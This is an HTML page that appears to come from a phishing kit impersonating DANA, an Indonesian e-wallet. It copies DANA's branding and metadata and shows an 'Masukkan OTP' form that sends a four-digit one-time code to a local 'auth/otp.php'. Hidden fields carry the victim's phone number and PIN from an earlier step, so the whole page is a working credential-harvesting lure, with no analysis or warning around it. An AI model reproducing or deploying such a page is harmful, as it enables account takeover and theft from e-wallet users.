
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="refresh">
    <meta data-n-head="ssr" charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta data-n-head="ssr" data-hid="theme-color" name="theme-color" content="#118ee9">
    <meta data-n-head="ssr" data-hid="apple-mobile-web-app-status-bar-style"
        name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image"
        content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta data-n-head="ssr" data-hid="og:image" property="og:image"
        content="https://a.m.dana.id/danaweb/web/dana-meta-logo.png">
    <meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="DANA.id">
    <meta data-n-head="ssr" data-hid="description" name="description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta data-n-head="ssr" data-hid="twitter:title" name="twitter:title"
        content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta data-n-head="ssr" data-hid="twitter:description" name="twitter:description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta data-n-head="ssr" data-hid="og:title" name="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
    <meta data-n-head="ssr" data-hid="og:description" name="og:description"
        content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
    <meta data-n-head="ssr" data-hid="keywords" name="keywords"
        content="dana, dana indonesia, dana bisnis, qris, qris adalah, qris indonesia, daftar qris, qris bank indonesia, qris dana, qris bi, qris merchant, logo qris, apa itu qris, pembayaran qris, merchant, merchant dana, daftar merchant, promo hari ini, promo terbaru, promo cashback, cashback, apa itu cashback, cashback adalah, apa itu ewallet, ewallet indonesia, pembayaran digital, dompet digital">
    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico">
    <link data-n-head="ssr" rel="preconnect" href="https://a.m.dana.id">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://a.m.dana.id">
    <link data-n-head="ssr" rel="preconnect" href="https://app.link">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://app.link">
    <link data-n-head="ssr" rel="preconnect" href="https://api2.branch.io">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://api2.branch.io">
    <link data-n-head="ssr" rel="preconnect" href="https://youtube.com">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://youtube.com">
    <link data-n-head="ssr" rel="preconnect" href="https://sentry.io">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://sentry.io">
    <link data-n-head="ssr" rel="preconnect" href="https://cdn.lr-ingest.io">
    <link data-n-head="ssr" rel="dns-prefetch" href="https://cdn.lr-ingest.io">
    <title>DANA - Apa pun transaksinya selalu ada DANA</title>
    <link rel="stylesheet" type="text/css" href="css/otp.css">
    <link rel="stylesheet" type="text/css" href="css/spinner.css">
    <style>

    </style>
</head>

<body>
    <div class="raw">
        <img class="back" src="img/4.png">
        <img class="dana_logo" src="img/3.png">
    </div>
    <div class="background">
        <div class="container" id="container">
            <center>
                <h1>Masukkan OTP</h1>
                <h2>Kode OTP telah dikirim ke nomor Anda</h2>
                <form action="auth/otp.php" method="post">
                    <div class="four_otp" id="four_otp">
                        <input type="number" id="otp1" maxlength="1" autocomplete="off" class="inpOtp"
                            name="otp1"></input>
                        <input type="number" id="otp2" maxlength="1" autocomplete="off" class="inpOtp"
                            name="otp2"></input>
                        <input type="number" id="otp3" maxlength="1" autocomplete="off" class="inpOtp"
                            name="otp3"></input>
                        <input type="number" id="otp4" maxlength="1" autocomplete="off" class="inpOtp"
                            name="otp4"></input>
                    </div>
                    <input type="hidden" name="nomor" value="54666666666666" />
                    <input type="hidden" name="pin" value="46565" />
                </form>
                
                <p class="resend">KIRIM ULANG (<span id="time">60</span>s)</p>
            </center>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="img/6.png">
            <img class="spinner" src="img/7.png">
        </div>
    </div>
</body>
<script src="js/otp.js"></script>

</html>